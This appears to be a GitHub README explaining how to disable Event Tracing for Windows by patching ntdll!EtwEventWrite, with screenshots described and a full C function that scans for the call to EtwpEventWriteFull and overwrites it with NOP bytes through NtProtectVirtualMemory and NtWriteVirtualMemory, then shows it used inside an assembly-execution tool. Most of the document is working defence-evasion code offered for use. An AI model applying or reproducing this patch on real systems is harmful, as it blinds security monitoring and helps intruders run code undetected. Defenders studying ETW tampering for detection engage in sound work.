# Patching ETW 

### Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers.  
### ntdll!EtwEventWrite is responsible for writing an event , it's not actually the function that do the Event Writing job, by reversing it, we can see that it calls ntdll!EtwpEventWriteFull that do the actual Event Writing :  
  
![IDAetw](https://user-images.githubusercontent.com/110354855/198856050-d5a3d460-0ad7-494b-abb8-018333d2f497.png)  
   
### this call is done at offset (0x214 -  0x1f0 = 0x24) and it takes 5 bytes, the idea here is to write a program that identify 0xe8 the opcode of the call instruction and overwrite this call memory with 5 bytes , so that the call will never done  
  

![TheCall](https://user-images.githubusercontent.com/110354855/198856198-a66c74e6-5833-47d4-a82c-1646206bf61b.png)

  
![EtwPatch](https://user-images.githubusercontent.com/110354855/198856224-12901961-150b-4116-946f-ad149705dc96.png)

### Here is the full Patch function :  
```c
void patchEtwpEventWriteFull(OUT HANDLE& hProc) {

    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");

    for (BYTE offset = 0; offset <= 100; offset++) {
        if (*((PBYTE)etwAddr + offset) == 0xe8 && *((PBYTE)etwAddr + offset + 9) == 0xc3) {
            char etwPatch[] = { 0x90, 0x90, 0x90, 0x90, 0x90 };

            DWORD lpflOldProtect = 0;
            unsigned __int64 memPage = 0x1000;
            void* etwAddr_bk = (void*)(((INT_PTR)etwAddr + offset));;

            NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
            if (!NT_SUCCESS(NtProtectStatus1)) {
                printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
                return;
            }

            NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, (LPVOID)((INT_PTR)etwAddr + offset), (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
            if (!NT_SUCCESS(NtWriteStatus)) {
                printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
                return;
            }

            NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
            if (!NT_SUCCESS(NtProtectStatus2)) {
                printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
                return;
            }
        }
        if (*((PBYTE)etwAddr + offset) == 0xc3) {
            break;
        }
    }
    

    std::cout << "[+] Patched etw!\n";

}
```
### Let's test it inside [ExecRemoteAssembly](https://github.com/D1rkMtr/ExecRemoteAssembly)  
  
  
https://user-images.githubusercontent.com/110354855/198856339-644c09c0-7299-4533-9175-716d639fb216.mp4  
  
## As you can see the ntdll!EtwEventWrite failed to write Event for the current process after patching it  




